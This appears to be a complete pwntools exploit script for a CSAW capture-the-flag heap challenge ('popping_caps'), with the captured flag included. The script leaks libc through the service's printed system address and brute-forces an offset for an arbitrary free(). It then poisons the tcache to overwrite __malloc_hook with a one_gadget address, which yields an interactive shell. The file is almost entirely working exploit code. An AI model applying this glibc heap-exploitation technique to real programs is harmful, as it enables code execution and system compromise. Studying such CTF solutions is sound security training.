from pwn import *

# r = process("./popping_caps")
r = ""
def malloc(size):
      r.sendline("1")
      r.recvuntil(":")
      r.sendline(str(size))
      r.recvuntil(":")

def free(off):
  r.sendline("2")
  r.recvuntil(":")
  r.sendline(str(off))
  r.recvuntil(":")

def write(data):
  r.sendline("3")
  r.recvuntil(":")
  r.send(data)

for offset in range(-0x10000, 0x10000, 0x1000):
    r = remote("pwn.chal.csaw.io", 1001)
    r.recvuntil("system ")
    leak = r.recvline()
    leak = int(leak, 16)
    libcbase = leak - 0x4f440
    mallochook = libcbase + 0x3ebc30

    r.recvuntil(":")

    
    offset = libcbase + 0x400000 + 0x228060 + 3904 + offset
    print hex(libcbase)
    print hex(offset)
    try:
        free(offset + 0x10)
    except:
        r.close()
        continue

    free(offset + 0x10)
    malloc(0x30)
    write(p64(mallochook))
    malloc(0x30)
    malloc(0x30)
    write(p64(libcbase + 0x10a38c))



    r.interactive()
#flag{1tsh1ghn000000000n}

